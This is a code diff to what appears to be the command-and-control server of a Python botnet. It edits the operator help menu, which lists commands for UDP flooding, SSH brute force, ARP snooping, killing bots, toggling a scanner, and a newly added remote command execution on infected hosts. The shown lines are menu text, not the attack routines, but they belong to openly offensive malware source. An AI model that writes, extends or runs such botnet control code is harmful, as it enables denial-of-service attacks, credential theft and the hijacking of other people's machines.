@@ -264,10 +264,11 @@ def Commander(sock,rlock):#cnc server
 				#shell_exec()
 			if cmd_str == '?' or cmd_str == 'help':
 				sock.send('\r\n#-- Commands --#\r\n'.encode())
-				sock.send('  UDP  Flood     : !udp  host port threads size\r\n\r\n'.encode())#udp flood
-				sock.send('  Doom Tab Opener: !doom url threads\r\n\r\n'.encode())#udp flood
+				sock.send('  UDP  Flood     : !udp  host port threads size\r\n'.encode())#udp flood
+				sock.send('  Doom Tab Opener: !doom url threads\r\n'.encode())#udp flood
 				sock.send('  Brute Force SSH: !bf_ssh host username timeout\r\n'.encode()) #brute force on port 22 of host
-				sock.send('  ARP Snoop      : !snoop\r\n\r\n'.encode()) #snooping bot/host arp table for local machines
+				sock.send('  ARP Snoop      : !snoop\r\n'.encode()) #snooping bot/host arp table for local machines
+				sock.send('  CMD Exec       : !cmd command\r\n'.encode()) #snooping bot/host arp table for local machines
 				sock.send('    !stop    : stop attack\r\n'.encode())
 				sock.send('    !kill    : kill all the bots\r\n'.encode())
 				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
